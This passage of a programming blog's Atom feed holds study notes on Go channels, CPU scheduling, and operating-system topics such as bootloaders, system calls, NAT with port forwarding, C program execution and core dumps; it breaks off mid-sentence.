variable）来实现同步。当发送者尝试发送数据时，它会先获取通道的锁<code>mutex_lock()</code>，检查是否有接收者准备好接收数据。如果没有，发送者会释放锁<code>mutex_unlock()</code>并进入阻塞状态；当接收者准备好接收数据时，它会获取锁，通知发送者可以发送数据<code>signal()</code>，然后进行数据的复制和接收操作。</li></ul><h2 id="关闭通道与测试阻塞"><a class="markdownIt-Anchor" href="#关闭通道与测试阻塞"></a> 关闭通道与测试阻塞</h2><p>通道可以被显式的关闭<code>close(chan)</code>，只有在当需要告诉接收者不会再提供新的值的时候，才需要关闭通道，因此只有发送者才会有关闭通道的需要。给已经关闭的通道发送或者再次关闭都会导致运行时 panic。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(ch)   <span class="comment">// 将通道标记为无法通过发送操作 `&lt;-` 接受更多的值</span></span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line"><span class="keyword">return</span> ch</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相应的，接收方需要一种方法检测通道有没有被阻塞（或被关闭）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">receive</span><span class="params">(ch <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> val, stat := &lt;- ch; stat &#123;</span><br><span class="line"><span class="comment">// 通道未关闭</span></span><br><span class="line">process()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>参考资料：</strong><br>[1] <a href="https://learnku.com/docs/the-way-to-go/141-concurrency-parallel-and-co-process/3685">https://learnku.com/docs/the-way-to-go/141-concurrency-parallel-and-co-process/3685</a><br>[2] <a href="https://zhuanlan.zhihu.com/p/1888238905700119670">Goroutine 和线程比较 - 知乎</a><br>[3] <a href="https://studygolang.com/articles/29227?fr=sidebar">GoLang GPM 模型 - Go 语言中文网 - Golang 中文社区</a><br>[4] <a href="https://fafucoder.github.io/2021/11/08/golang-goroutine/">https://fafucoder.github.io/2021/11/08/golang-goroutine/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Don’t communicate by sharing memory; share memory by communicating.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;goroutine&quot;&gt;&lt;a class=&quot;markdownI</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Operating System Concepts: Process Scheduling</title>
    <link href="http://example.com/2025/02/28/Operating-System-Concepts-Ch5/"/>
    <id>http://example.com/2025/02/28/Operating-System-Concepts-Ch5/</id>
    <published>2025-02-28T11:15:55.951Z</published>
    <updated>2025-02-28T11:21:25.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Attenion: we use <em><strong>process scheduling</strong></em> when discussing general scheduling concepts.</p></blockquote><h1 id="key-objects"><a class="markdownIt-Anchor" href="#key-objects"></a> Key Objects</h1><ul><li>Introduce CPU-scheduling (object, method, criteria)</li><li>List some common CPU-scheduling algorithms</li></ul><blockquote><p>Q: Why we address <strong>CPU-scheduling</strong> instead of <strong>scheduling</strong> itself?<br>A: Scheduling of this kind is a fundamental operating-system function. Almost all computer resources are scheduled before use.</p></blockquote><h1 id="basic-scheduling-concepts"><a class="markdownIt-Anchor" href="#basic-scheduling-concepts"></a> Basic Scheduling Concepts</h1><h2 id="preemptive-and-nonpreemptive-scheduling"><a class="markdownIt-Anchor" href="#preemptive-and-nonpreemptive-scheduling"></a> Preemptive and Nonpreemptive Scheduling</h2><h3 id="1-preemptive-scheduling"><a class="markdownIt-Anchor" href="#1-preemptive-scheduling"></a> 1. Preemptive Scheduling</h3><ul><li><strong>Definition</strong>: In preemptive scheduling, the operating system can interrupt a running process before it completes, allowing another process to use the CPU. This ensures that no single process monopolizes the CPU for too long.</li></ul><h3 id="2-nonpreemptive-scheduling"><a class="markdownIt-Anchor" href="#2-nonpreemptive-scheduling"></a> 2. Nonpreemptive Scheduling</h3><ul><li><strong>Definition</strong>: In nonpreemptive scheduling, once a process starts executing, it cannot be interrupted until it voluntarily releases the CPU (e.g., by terminating or <strong>waiting for I/O</strong>).</li></ul><h2 id="components"><a class="markdownIt-Anchor" href="#components"></a> Components</h2><h3 id="1-cpu-scheduler"><a class="markdownIt-Anchor" href="#1-cpu-scheduler"></a> 1. CPU Scheduler</h3><p><strong>CPU-scheduler</strong>, or <strong>short-term scheduler</strong>, is responsible for selecting one of the processes in the ready queue and allocating the CPU to that process, when the CPU becomes idle.</p><h3 id="2-dispatcher"><a class="markdownIt-Anchor" href="#2-dispatcher"></a> 2. Dispatcher</h3><p>Different from CPU scheduler, <strong>dispatcher</strong> is the module that gives control of the CPU to the selected process. Its function involves the following:</p><ul><li>Switching contex</li><li>Switching to user mode</li><li>Jumping to the proper location in the user program to restart</li></ul><h1 id="scheduling-criteria"><a class="markdownIt-Anchor" href="#scheduling-criteria"></a> Scheduling Criteria</h1><ul><li>CPU utilization: keep CPU as busy as possible</li><li>Throughput: the number of processes completed per time unit</li><li>Turnaround time: the sum of the periods spent waiting, executing and doing I/O</li><li>Waiting time</li><li>Response time</li></ul><h1 id="scheduling-algorithms"><a class="markdownIt-Anchor" href="#scheduling-algorithms"></a> Scheduling Algorithms</h1><ul><li>First-Come, First-Served Scheduling (FCFS)</li><li>Shortest-Job-First Scheduling</li><li>Priority Scheduling</li><li>Round-Robin Scheduling (RR)</li><li>Multilevel Queue Scheduling</li><li>Multilevel Feedback Queue Scheduling (MLFQ)</li></ul><hr><p><strong>Reference:</strong></p><ul><li>DeepSeek</li><li><em>Operating System Concepts, 9th edition</em></li><li><a href="https://www.bilibili.com/video/BV18T1FYMEiJ/?spm_id_from=333.1387.homepage.video_card.click">冠以图灵奖之名的调度算法：MLFQ 多级反馈队</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Attenion: we use &lt;em&gt;&lt;strong&gt;process scheduling&lt;/strong&gt;&lt;/em&gt; when discussing general scheduling concepts.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2024-1学习思考点滴汇总</title>
    <link href="http://example.com/2025/01/15/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E6%9C%9F%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83%E7%9A%84%E7%82%B9%E6%BB%B4%E6%B1%87%E6%80%BB/"/>
    <id>http://example.com/2025/01/15/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E6%9C%9F%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83%E7%9A%84%E7%82%B9%E6%BB%B4%E6%B1%87%E6%80%BB/</id>
    <published>2025-01-15T09:03:31.781Z</published>
    <updated>2025-01-15T10:08:39.306Z</updated>
    
    <content type="html"><![CDATA[<h1 id="preface"><a class="markdownIt-Anchor" href="#preface"></a> Preface</h1><p>我很喜欢姜夔诗《暗香》中的一句词：“等恁时、重觅幽香，已入小窗横幅”。身处在许多个“当时”的我并未能很好地把握好当下，诚然这有时间的局限性的原因，没法以全局的视角统筹好每一步，但我是可以做到的是不懈坚持与难以被外界干扰所消磨的热爱呀。“年年陌上生秋草”，待到回首，感觉自己并没有做什么，实现什么。可是再一步步往前看，却这学期的收获是要比上学期多得多的，但遗憾的还是没能完成自己制定好的计划和目标。</p><p>以下汇总了我在每日学习中的一些疑问与思考，它们对我来说意义重大，是我这一学期一点一滴收集起来的困惑、灵感与喜悦。我将它们按照特定的话题分类，在我以后有同样疑问时能快速地找回以前的答案，同时也不断以此不断勉励自己——不断思考、保持热爱！</p><hr><h1 id="软硬件技术"><a class="markdownIt-Anchor" href="#软硬件技术"></a> 软硬件技术</h1><h2 id="how-the-web-works"><a class="markdownIt-Anchor" href="#how-the-web-works"></a> How the web works</h2><p>实用的例子: <a href="https://developer.mozilla.org/en-US/docs/Learn/Getting_started_with_the_web/How_the_Web_works">How the web works - Learn web development | MDN (mozilla.org)</a><br><a href="https://www.bilibili.com/video/BV1Bn6BY5E1g/?spm_id_from=333.1387.favlist.content.click">网站是如何构建起来的？bilibili</a></p><h2 id="principle-of-portability-characteristic-in-electron"><a class="markdownIt-Anchor" href="#principle-of-portability-characteristic-in-electron"></a> Principle of portability characteristic in Electron</h2><p><a href="https://juejin.cn/post/7103337772424888356">从 Electron 架构出发，深究 Electron 跨端原理 | 多图详解跨平台桌面应用Electron想必大家都不 - 掘金</a></p><hr><h1 id="需要了解的工具"><a class="markdownIt-Anchor" href="#需要了解的工具"></a> 需要了解的工具</h1><h2 id="gui-what-is-qt"><a class="markdownIt-Anchor" href="#gui-what-is-qt"></a> GUI-What is Qt</h2><blockquote><p>Qt is a cross-platform application development framework for desktop, embedded and mobile.</p><p>Qt is <em>not</em> a programming language on its own. It is a framework written in C++. A <strong>preprocessor</strong>, the <a href="http://doc.qt.io/qt-5/moc.html">MOC (Meta-Object Compiler)</a>, is used to extend the C++ language with features like <a href="http://doc.qt.io/qt-5/signalsandslots.html">signals and slots</a>. Before the compilation step, the MOC parses the source files written in Qt-extended C++ and generates standard compliant C++ sources from them. Thus the framework itself and applications/libraries using it can be compiled by any standard compliant C++ compiler like Clang, GCC, ICC, MinGW and MSVC.</p></blockquote><h2 id="gccgnu-compiler-collection-verus-clangllvm"><a class="markdownIt-Anchor" href="#gccgnu-compiler-collection-verus-clangllvm"></a> GCC(GNU Compiler Collection) verus Clang/LLVM</h2><p><a href="https://www.cnblogs.com/findumars/p/14213309.html">GCC与Clang / LLVM：C / C ++编译器的深度比较 - findumars - 博客园 (cnblogs.com)</a></p><h3 id="三种主流c编译器"><a class="markdownIt-Anchor" href="#三种主流c编译器"></a> 三种主流C++编译器</h3><p>Visual C ++，GNU编译器集合（GCC）和Clang /低级虚拟机（LLVM）是业界三种主流的C / C ++编译器。Visual C ++提供了图形用户界面（GUI），易于调试，但不适用于Linux平台。因此，本文主要比较GCC与Clang / LLVM。</p><p>GCC是GNU开发的一种程序语言编译器。它是根据GNU通用公共许可证（GPL）和GNU较小通用公共许可证（LGPL）发布的一组免费软件。它是GNU和Linux系统的官方编译器，也是用于编译和创建其他UNIX操作系统的主要编译器。</p><p>LLVM包含一系列模块化的编译器组件和工具链。它可以在编译，运行时和空闲时间优化程序语言和链接，并生成代码。LLVM可以作为多种语言的编译器的背景。Clang是一种C，C ++，Objective-C或Objective-C ++编译器，<strong>它基于LLVM用C ++编译</strong>，并根据Apache 2.0许可发行。Clang主要用于提供优于GCC的性能。</p><h2 id="difference-between-cmake-and-make"><a class="markdownIt-Anchor" href="#difference-between-cmake-and-make"></a> Difference between Cmake and Make</h2><ul><li><a href="https://makefiletutorial.com/">pratical tutorial of Makefile</a></li><li><a href="https://earthly.dev/blog/cmake-vs-make-diff/">concepts</a></li></ul><hr><h1 id="四大件学习中的知识点主要是os"><a class="markdownIt-Anchor" href="#四大件学习中的知识点主要是os"></a> 四大件学习中的知识点（主要是OS）</h1><h2 id="command-interpreter的实现"><a class="markdownIt-Anchor" href="#command-interpreter的实现"></a> Command interpreter的实现</h2><p>Two approaches to implement a command interpreter</p><ol><li>command interpreter contains the code to execute the command<br>Embed the code needed to execute a command directly within the <strong>command interpreter</strong>.This method has the advantage of <strong>faster execution</strong> (think about why?–&gt;context switch!) since the command interpreter can immediately access the necessary code <strong>without relying on external system programs</strong>. However, a potential downside is that it may lead to a larger and more complex command interpreter, as it must accommodate the code for all possible commands.</li><li>Implement most commands through system programs (kernel state?)<br>This method offers the advantage of <strong>modularity</strong>, as each command is independent and can be updated or modified without affecting the command interpreter. However, the trade-off for this modularity is that the command interpreter <strong>must rely on external programs</strong> to execute commands, which may result in <strong>slower performance and increased resource usage</strong>, especially if multiple system programs are involved (frequent context switching and mode switching: user mode -&gt; kernel mode).</li></ol><p><a href="https://www.bilibili.com/video/BV1BW421R79Q/?spm_id_from=333.1387.collection.video_card.click&amp;vd_source=00a51e4c2b49db794dc314bf2a3b1e5a">进程编程接口 | Shell 是如何构建的？</a></p><h1 id="syscall"><a class="markdownIt-Anchor" href="#syscall"></a> syscall</h1><p>Q: A system call is a process? Difference between process and routine, how latter one execute?<br>A: No, a system call is not a process. Instead, a system call is a mechanism that allows a program (or process) to <strong>request a service from the operating system’s kernel</strong>, such as accessing hardware resources, creating files, or managing processes. In essence, system calls are indeed pieces of compiled code that the OS kernel provides to handle specific, privileged tasks safely and efficiently.</p><p>视频资源：<a href="https://www.bilibili.com/video/BV1NFrhYzE5M/?spm_id_from=333.1387.favlist.content.click&amp;vd_source=00a51e4c2b49db794dc314bf2a3b1e5a">99%的开发者并不理解系统调用？ | 系统调用 内核模式 用户模式_哔哩哔哩_bilibili</a></p><h2 id="bootloader"><a class="markdownIt-Anchor" href="#bootloader"></a> Bootloader</h2><p>Q: When a CPU recieves a  reset event, the instruction register is loaded with a predefined memory location, at which is the initial bootstrap program. Then CPU execute the boot loader to load the kernel to the main memory. So why not directly load the kernel to memory when start up?</p><p>How the bootstrap program is loaded and then be executed? Execeute the small piece of code in firmware thoroughly or then load the complete bootstrap into main memory and start its execution?</p><p>A: The bootstrap loader is essential for the startup process because, at power-on or reset, the CPU has very limited capability—it doesn’t “know” where or how to load the full operating system. Here’s how it all works:</p><ol><li><strong>Directly Loading the Kernel</strong>: Loading the kernel directly at startup would mean the CPU would have to know exactly where and how the kernel is stored. But at the time of powering on, the CPU has no information about the storage device (like a hard disk or SSD) or how to access it. <strong>It only has a small set of instructions and memory address where it starts executing upon reset</strong>. Hence, we use a bootstrap loader.</li><li><strong>Bootstrap Process</strong>: When the CPU starts up, it immediately begins executing code from a fixed address, often set to the Basic Input/Output System (BIOS) or similar firmware in modern computers. This code is very minimal and is part of a read-only memory (ROM). This firmware contains a tiny program known as the initial bootstrap loader, which is responsible for <strong>performing the initial checks and locating a more complex loader</strong> (usually on a storage device) that can load the OS.</li><li><strong>How the Bootstrap Program is Loaded</strong>: <strong>The initial bootstrap code in firmware runs completely from ROM.</strong> This code performs essential checks (like the Power-On Self Test) and then searches for a bootable device. Once it locates the storage device containing the bootloader, it loads a small portion of the bootloader into memory.</li><li><strong>From Firmware to Main Memory Execution</strong>: The small firmware-based bootstrap then <strong>loads the complete bootloader</strong> (usually stored in the Master Boot Record or MBR) into main memory. This complete <strong>bootloader now has the necessary instructions to locate and load the kernel</strong>, which then takes over and starts initializing the operating system.</li></ol><p>In summary: <strong>The initial bootstrap in ROM is essential because the CPU lacks any knowledge of storage at startup. This small, firmware-resident code loads a more capable bootloader, which then brings in the OS kernel.</strong></p><h3 id="bootstrap-program-vs-bootloader"><a class="markdownIt-Anchor" href="#bootstrap-program-vs-bootloader"></a> Bootstrap program v.s. Bootloader</h3><p>The bootstrap program (or initial bootstrap) and the bootloader are indeed separate parts of the startup process, and they each play a specific role in getting the OS loaded. Here’s a quick recap:</p><ol><li><strong>Bootstrap Program</strong>:<ul><li><strong>Location</strong>: Stored in ROM (often part of the firmware, like BIOS or UEFI).</li><li><strong>Purpose</strong>: Executes first, performing initial system checks and finding a bootable device.</li><li><strong>Function</strong>: Loads the bootloader from the storage device (e.g., hard disk, SSD) into main memory.</li><li><strong>Execution</strong>: The CPU automatically starts here when powered on or reset.</li></ul></li><li><strong>Bootloader</strong>:<ul><li><strong>Location</strong>: Stored on a bootable storage device, like in the Master Boot Record (MBR) or a dedicated partition.</li><li><strong>Purpose</strong>: Loads the operating system kernel into main memory.</li><li><strong>Execution</strong>: Once the bootstrap program loads it into RAM, it can execute more complex instructions to locate and load the OS kernel.</li></ul></li><li><strong>Kernel and OS Startup</strong>:<ul><li>Once the bootloader has done its job and loaded the kernel into memory, it transfers control to the kernel.</li><li>At this point, the operating system officially begins to run, taking over full control to initialize and manage hardware, load essential services, and provide an environment for user applications.</li></ul></li></ol><p>So the sequence is: <strong>bootstrap program (in ROM) → bootloader (from storage) → kernel (OS)</strong>. After the kernel loads, the OS is running!</p><h2 id="what-is-abi-application-binary-interface"><a class="markdownIt-Anchor" href="#what-is-abi-application-binary-interface"></a> What is ABI (Application Binary Interface)?</h2><p><strong><em>From wikipedia:</em></strong><br>In computer software, an <strong>application binary interface</strong> (<strong>ABI</strong>) is an interface between two binary program modules. Often, one of these modules is a library or operating system facility, and the other is a program that is being run by a user.</p><p>An ABI defines how data structures or computational routines are accessed <strong>in manchin code</strong>, which is a low-level, hardware-dependent format. In contrast, an application programming interface (API) defines this access <strong>in source code</strong>, which is a relatively high-level, hardware-independent, often human-readable format.</p><h2 id="routine-and-process"><a class="markdownIt-Anchor" href="#routine-and-process"></a> Routine and Process</h2><h3 id="routine"><a class="markdownIt-Anchor" href="#routine"></a> Routine:</h3><ul><li>A routine (also called a <strong>function</strong>, <strong>procedure</strong>, or <strong>subroutine</strong>) is a block of reusable code designed to perform a specific task.</li><li>It runs within the context of a single <strong>process</strong>.</li><li><strong>It is invoked by other parts of a program and executes in the same memory space as the program.</strong> – spot on!</li><li>Examples include standard library functions like <code>printf()</code> in C or a custom function like <code>calculateSum()</code>.</li></ul><h3 id="process"><a class="markdownIt-Anchor" href="#process"></a> Process:</h3><ul><li>A process is an instance of a program that is in execution.</li><li>It is a <strong>larger execution unit</strong> that includes the program’s code, data, and resources (e.g., memory, file handles).</li><li>Processes run independently and are managed by the operating system.</li><li>They often communicate with other processes through mechanisms like inter-process communication (IPC).</li></ul><h2 id="端口转发与nat"><a class="markdownIt-Anchor" href="#端口转发与nat"></a> 端口转发与NAT</h2><p>You’re absolutely right that a NAT gateway inherently performs address translation and reverse mapping as part of its normal operations. Your understanding of how the gateway matches incoming packets to the correct LAN node based on its NAT table is spot-on. Let me clarify where <strong>port forwarding</strong> fits into the picture and why it’s necessary in some cases.</p><h3 id="nat-basics-recap"><a class="markdownIt-Anchor" href="#nat-basics-recap"></a> NAT Basics Recap</h3><ul><li><strong>Outbound traffic</strong>: When a LAN node (e.g., <code>192.168.1.100</code>) sends a packet to an external server, the gateway translates the source IP (<code>192.168.1.100</code>) and port (e.g., <code>10</code>) to its own external IP (<code>1.1.1.1</code>) and a unique port (e.g., <code>3000</code>). This creates an entry in the NAT table that maps <code>(1.1.1.1:3000)</code> to <code>(192.168.1.100:10)</code>.</li><li><strong>Inbound traffic</strong>: When the external server responds to <code>(1.1.1.1:3000)</code>, the gateway checks its NAT table, finds the mapping, and forwards the packet to <code>(192.168.1.100:10)</code>.<br>This works seamlessly <strong>for connections initiated from within the LAN</strong> because the NAT table is populated dynamically when the outbound connection is made.</li></ul><hr><h3 id="the-role-of-port-forwarding"><a class="markdownIt-Anchor" href="#the-role-of-port-forwarding"></a> The Role of Port Forwarding</h3><p>Port forwarding is needed for <strong>connections initiated from outside the LAN</strong> (e.g., an external client trying to access a server or service running inside the LAN). Here’s why:</p><ol><li><strong>No NAT Table Entry for Unsolicited Traffic</strong>:<ul><li>If an external client sends a packet to <code>1.1.1.1</code> with no prior outbound connection from the LAN, the gateway won’t have a corresponding NAT table entry.</li><li>The gateway doesn’t know which internal node to forward the packet to, so it drops the packet by default.</li></ul></li><li><strong>Port Forwarding as a Manual Mapping</strong>:<ul><li>Port forwarding creates a static rule in the gateway to map incoming packets with a specific port on the gateway’s external IP to a specific internal node and port.</li><li>For example, you can configure the gateway to forward traffic on <code>1.1.1.1:8080</code> to <code>192.168.1.100:80</code>.</li></ul></li><li><strong>Use Case</strong>:<ul><li>Say you’re hosting a web server on <code>192.168.1.100</code> (LAN) and want clients from the internet to access it. Without port forwarding, their requests will be dropped because the gateway has no NAT table entry.</li><li>By setting up port forwarding, the gateway knows to forward all packets received on <code>1.1.1.1:8080</code> to <code>192.168.1.100:80</code>, allowing external clients to reach the web server.</li></ul></li></ol><hr><h3 id="how-port-forwarding-differs-from-nat"><a class="markdownIt-Anchor" href="#how-port-forwarding-differs-from-nat"></a> How Port Forwarding Differs from NAT</h3><ul><li><strong>Dynamic vs. Static</strong>:<ul><li>NAT dynamically creates mappings as a result of outgoing connections.</li><li>Port forwarding involves static, predefined mappings for incoming connections.</li></ul></li><li><strong>Purpose</strong>:<ul><li>NAT primarily enables multiple LAN nodes to share a single public IP for outbound traffic.</li><li>Port forwarding enables specific services inside the LAN to be accessible from the outside.</li></ul></li></ul><hr><h3 id="analogy-nat-vs-port-forwarding"><a class="markdownIt-Anchor" href="#analogy-nat-vs-port-forwarding"></a> Analogy: NAT vs. Port Forwarding</h3><p>Think of NAT as a receptionist in an office building:</p><ul><li><strong>Outgoing call</strong>: The receptionist notes which employee is making the call and forwards it to the recipient. When the recipient calls back, the receptionist connects them to the correct employee.</li><li><strong>Incoming call without prior contact</strong>: If someone calls the office without knowing who to talk to, the receptionist doesn’t know where to direct the call unless there’s a predefined rule (“All calls to extension 8080 go to Bob”).</li></ul><p>Port forwarding is like setting up such predefined rules for incoming calls.</p><h2 id="进程的返回"><a class="markdownIt-Anchor" href="#进程的返回"></a> 进程的返回</h2><p>Q: A program ends when it execute to <code>return</code>?</p><p>A: A break down the entire process of executing a simple “Hello, World!” program, from when the kernel loads the program to when it gets the exit status back. This includes the key functions like <code>execve</code>, <code>__libc_start_main</code>, and <code>_exit</code>.</p><h3 id="1-source-code"><a class="markdownIt-Anchor" href="#1-source-code"></a> 1. Source Code</h3><p>The simplest “Hello, World!” program in C:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>);     </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-compilation"><a class="markdownIt-Anchor" href="#2-compilation"></a> 2. Compilation</h3><p>When you compile this program (e.g., <code>gcc hello.c -o hello</code>), the following steps occur:</p><ol><li><strong>Translation</strong>:<ul><li>The source code is converted into an object file (<code>hello.o</code>) with machine code.</li></ul></li><li><strong>Linking</strong>:<ul><li>The linker combines <code>hello.o</code> with the C runtime and standard library (e.g., <code>libc.so</code>).</li><li>The resulting binary includes references to external shared libraries (if dynamically linked) or embeds those libraries if statically linked.</li></ul></li></ol><h3 id="3-program-execution"><a class="markdownIt-Anchor" href="#3-program-execution"></a> 3. Program Execution</h3><p>Assuming the compiled program is called <code>hello</code>, when you run <code>./hello</code>, here’s the step-by-step breakdown:</p><h4 id="step-1-the-kernel-loads-the-progra"><a class="markdownIt-Anchor" href="#step-1-the-kernel-loads-the-progra"></a> Step 1: The Kernel Loads the Progra</h4><ol><li><strong><code>execve</code> System Call</strong>:<ul><li>The shell (or another parent process) calls the <code>execve</code> system call to start your program:<br><code>execve(&quot;./hello&quot;, argv, envp);</code></li><li>The kernel:<ol><li>Reads the program’s ELF header to understand its structure.</li><li>Maps the program’s sections (e.g., code, data, etc.) into memory.</li><li>Sets up the process’s stack with <code>argv</code> and <code>envp</code>.</li></ol></li></ul></li><li><strong>Transfer Control to <code>_start</code></strong>:<ul><li><code>_start</code> is the entry point of the program, specified in the ELF file. It is provided by the C runtime and is the very first code executed in your process.</li></ul></li></ol><h4 id="step-2-_start-initializes-the-program"><a class="markdownIt-Anchor" href="#step-2-_start-initializes-the-program"></a> Step 2: <code>_start</code> Initializes the Program</h4><ol><li><strong>Set Up the Environment</strong><ul><li><code>_start</code> is a small assembly stub that:<ul><li>Sets up the stack and registers.</li><li>Prepares <code>argc</code>, <code>argv</code>, and <code>envp</code> for passing to <code>__libc_start_main</code>.</li></ul></li></ul></li><li><strong>Call <code>__libc_start_main</code></strong>:<ul><li><code>_start</code> calls <code>__libc_start_main</code> (part of <code>libc</code>), passing the address of <code>main()</code> and other parameters:<br><code>__libc_start_main(main, argc, argv, ...);</code></li></ul></li></ol><h4 id="step-3-__libc_start_main-orchestrates-execution"><a class="markdownIt-Anchor" href="#step-3-__libc_start_main-orchestrates-execution"></a> Step 3: <code>__libc_start_main</code> Orchestrates Execution</h4><ol><li><strong>Initialize the Runtime</strong>:<ul><li><code>__libc_start_main</code> does several things before calling <code>main()</code>:<ul><li>Initializes the heap and other runtime features.</li><li>Runs constructors for global objects (if using C++).</li><li>Sets up dynamic linking (if needed).</li></ul></li></ul></li><li><strong>Call <code>main()</code></strong>:<ul><li>After initialization, <code>__libc_start_main</code> calls <code>main()</code>:<br><code>int exit_code = main(argc, argv);</code></li></ul></li></ol><h4 id="step-4-main-executes-user-code"><a class="markdownIt-Anchor" href="#step-4-main-executes-user-code"></a> Step 4: <code>main()</code> Executes User Code</h4><ol><li>In our case, <code>main()</code> calls <code>printf</code>:<br><code>printf(&quot;Hello, World!\n&quot;);</code><ul><li><code>printf</code> formats the string and writes it to the standard output buffer.</li></ul></li><li>After <code>printf</code> finishes, <code>main()</code> returns 0.</li></ol><h4 id="step-5-cleanup-and-exit"><a class="markdownIt-Anchor" href="#step-5-cleanup-and-exit"></a> Step 5: Cleanup and Exit</h4><ol><li><strong>Return to <code>__libc_start_main</code></strong>:<ul><li>After <code>main()</code> returns, control goes back to <code>__libc_start_main</code>.</li></ul></li><li><strong>Call <code>exit()</code></strong>:<ul><li><code>__libc_start_main</code> calls the <code>exit()</code> function with the return value from <code>main()</code>:<br><code>exit(exit_code);</code></li></ul></li><li><strong>Perform Cleanup</strong>:<ul><li><code>exit()</code>:<ul><li>Runs functions registered with <code>atexit()</code>.</li><li>Flushes and closes all open streams.</li><li>Calls <code>_exit()</code> to terminate the process.</li></ul></li></ul></li><li><strong>Call <code>_exit()</code></strong>:<ul><li><code>_exit()</code> makes a system call (<code>exit_group</code> or <code>exit</code>) to notify the kernel that the process is terminating:<br><code>syscall(SYS_exit_group, exit_code);</code></li></ul></li></ol><h4 id="step-6-the-kernel-cleans-up"><a class="markdownIt-Anchor" href="#step-6-the-kernel-cleans-up"></a> Step 6: The Kernel Cleans Up</h4><ol><li>The kernel performs final cleanup:<ul><li>Reclaims memory and other resources used by the process.</li><li>Marks the process as terminated.</li></ul></li><li>The kernel updates the parent process (e.g., the shell) with the exit status of the terminated program.</li></ol><h3 id="summary-with-key-functions"><a class="markdownIt-Anchor" href="#summary-with-key-functions"></a> Summary with Key Functions</h3><p>Here’s the entire process mapped to the key functions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. Parent process calls `execve(&quot;./hello&quot;, ...)` -&gt; Kernel loads the ELF binary.</span><br><span class="line">2. Kernel sets up process memory and jumps to `_start`. </span><br><span class="line">3. `_start` calls `__libc_start_main(main, ...)`. </span><br><span class="line">4. `__libc_start_main` initializes runtime and calls `main()`. </span><br><span class="line">5. `main()` runs user code and returns an exit code. </span><br><span class="line">6. `__libc_start_main` calls `exit(exit_code)`. </span><br><span class="line">7. `exit()` flushes streams, calls `_exit(exit_code)`. </span><br><span class="line">8. `_exit(exit_code)` makes a syscall to terminate the process. </span><br><span class="line">9. Kernel cleans up and updates the parent with the exit status.``</span><br></pre></td></tr></table></figure><p>This process illustrates how a simple program involves several layers of initialization, execution, and cleanup, seamlessly transitioning between user-level code and kernel-level actions.</p><h2 id="core-dumped"><a class="markdownIt-Anchor" href="#core-dumped"></a> Core dumped</h2><h3 id="what-is-a-core-dump"><a class="markdownIt-Anchor" href="#what-is-a-core-dump"></a> What is a Core Dump?</h3><p>A <strong>core dump</strong> is a file (snapshot) that captures the memory state of a running process at a specific point in time, usually when the program crashes due to a severe error like a <strong>segmentation fault</strong>. It contains:</p><ol><li><strong>Memory Contents</strong>: The contents of the program’s memory (stack, heap, and data segments) at the time of the crash.</li><li><strong>Registers</strong>: The values in CPU registers.</li><li><strong>Execution Context</strong>: Information about the program’s execution, such as the program counter and the instruction that caused the fault.</li><li><strong>Other Metadata</strong>: Details about the process, such as environment variables, command-line arguments, and signal information.</li></ol><h3 id="why-does-a-core-dump-file-need-to-be-generated"><a class="markdownIt-Anchor" href="#why-does-a-core-dump-file-need-to-be-generated"></a> Why Does a Core Dump File Need to Be Generated?</h3><p>A core dump is ideal when:</p><ul><li><strong>The program is no longer running</strong>: You can’t attach a debugger because the process has terminated.</li><li><strong>The crash is hard to reproduce</strong>: Core dumps provide a snapshot of the fault, so you don’t need to recreate the conditions leading to the crash.</li><li><strong>Sharing Debug Information</strong>: You can send the core dump to someone else (e.g., another developer or a support team) for analysis.</li></ul><h3 id="is-a-core-dump-necessary"><a class="markdownIt-Anchor" href="#is-a-core-dump-necessary"></a> Is a Core Dump Necessary?</h3><p>A core dump file is <strong>useful</strong> but <strong>not strictly necessary</strong> for debugging a program crash. It depends on your situation and debugging needs.</p><p>Use Core Dumps When:</p><ul><li>The process has already crashed and terminated.</li><li>The crash is <strong>difficult to 